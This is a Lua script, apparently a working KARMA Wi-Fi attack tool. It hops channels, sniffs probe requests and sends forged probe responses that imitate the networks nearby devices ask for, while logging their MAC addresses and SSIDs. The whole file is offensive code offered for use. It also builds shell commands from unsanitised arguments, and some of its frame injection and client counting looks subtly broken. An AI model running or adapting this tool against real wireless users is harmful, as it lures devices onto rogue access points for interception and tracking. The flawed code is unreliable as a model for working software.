local iface = arg[1]
local channel = arg[2] or "1"
local bssid = arg[3] or "AA:BB:CC:DD:EE:FF"

local clients = {}

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":' .. json_escape(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function set_channel(ch)
  os.execute("iw dev " .. iface .. " set channel " .. ch .. " 2>/dev/null")
  os.execute("iwconfig " .. iface .. " channel " .. ch .. " 2>/dev/null")
end

local function is_valid_mac(mac)
  return mac:match("^%x%x:%x%x:%x%x:%x%x:%x%x:%x%x$") ~= nil
end

local function build_probe_response(request_ssid, client_mac)
  local ssid = request_ssid
  if #ssid == 0 then ssid = "AP_" .. math.floor(os.time() * 1000 % 10000) end
  local ssid_len = #ssid
  if ssid_len > 32 then ssid_len = 32 end

  local frame = string.char(0x50, 0x00)
  frame = frame .. string.char(0x00, 0x00)
  for b in client_mac:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  for b in bssid:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  for b in bssid:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
  frame = frame .. string.char(0x64, 0x00)
  frame = frame .. string.char(0x31, 0x04)
  frame = frame .. string.char(0x00, ssid_len) .. ssid:sub(1, ssid_len)
  frame = frame .. string.char(0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)
  frame = frame .. string.char(0x03, 0x01, tonumber(channel) or 1)
  return frame
end

local function send_probe_response(ssid, client_mac)
  local frame = build_probe_response(ssid, client_mac)
  local tmp = "/tmp/karma_resp_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then return false end
  f:write(frame)
  f:close()
  os.execute("cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null")
  return true
end

local function start_airodump()
  local cmd = "airodump-ng " .. iface .. " -c " .. channel .. " 2>/dev/null"
  local f = io.popen(cmd)
  if not f then
    telemetry("error", '{"error":"Failed to start airodump-ng"}')
    return nil
  end
  return f
end

local function sniff_probe_requests()
  local cmd = "tshark -l -i " .. iface .. " -Y \"wlan.fc.type_subtype == 4\" -T fields -e wlan.sa -e wlan.ssid 2>/dev/null"
  local f = io.popen(cmd)
  if not f then
    telemetry("error", '{"error":"Failed to start tshark, trying tcpdump fallback"}')
    local cmd2 = "tcpdump -l -i " .. iface .. " -e -s 256 type mgt subtype probe-req 2>/dev/null"
    f = io.popen(cmd2)
    if not f then
      telemetry("error", '{"error":"tshark and tcpdump unavailable, falling back to airodump"}')
      return nil
    end
  end
  return f
end

local function process_probe_requests()
  local sniffer = sniff_probe_requests()
  if not sniffer then
    local dump = start_airodump()
    if not dump then return end
    telemetry("sniff_mode", '{"method":"airodump"}')
    while true do
      local line = dump:read("*l")
      if not line then break end
      if line:find("Probe") or line:find("probe") then
        telemetry("probe_seen", '{"raw":' .. json_escape(line:sub(1, 200)) .. '}')
      end
    end
    dump:close()
    return
  end

  telemetry("sniff_mode", '{"method":"tshark/tcpdump"}')
  local count = 0
  while count < 100 do
    local line = sniffer:read("*l")
    if not line then break end
    local sa, probe_ssid = line:match("([%x:]+)%s+(.*)")
    if sa and is_valid_mac(sa) then
      if not clients[sa] then
        clients[sa] = {first_seen = os.time(), probes = {}}
      end
      local ssid_str = probe_ssid or ""
      clients[sa].probes[#clients[sa].probes + 1] = ssid_str
      telemetry("probe_request", '{"client":' .. json_escape(sa) .. ',"ssid":' .. json_escape(ssid_str) .. ',"total_clients":' .. tostring(#clients) .. '}')
      local ok, err = pcall(send_probe_response, ssid_str, sa)
      if ok then
        telemetry("probe_response", '{"client":' .. json_escape(sa) .. ',"ssid":' .. json_escape(ssid_str) .. '}')
      else
        telemetry("response_fail", '{"error":' .. json_escape(tostring(err)) .. '}')
      end
    end
    count = count + 1
  end
  sniffer:close()
end

local function channel_hop()
  local chans = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "36", "40", "44", "48"}
  for _, ch in ipairs(chans) do
    set_channel(ch)
    telemetry("channel_hop", '{"channel":' .. json_escape(ch) .. '}')
    local ok, err = pcall(process_probe_requests)
    if not ok then
      telemetry("error", '{"channel":' .. json_escape(ch) .. ',"error":' .. json_escape(tostring(err)) .. '}')
    end
  end
end

if not iface then
  telemetry("error", '{"error":"Usage: karma_attack.lua <interface> [channel] [bssid]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Interface not in monitor mode"}')
  os.exit(1)
end

set_channel(channel)
telemetry("karma_start", '{"mode":"responder","channel":' .. json_escape(channel) .. '}')
channel_hop()
telemetry("complete", '{"total_clients":' .. tostring(#clients) .. '}')
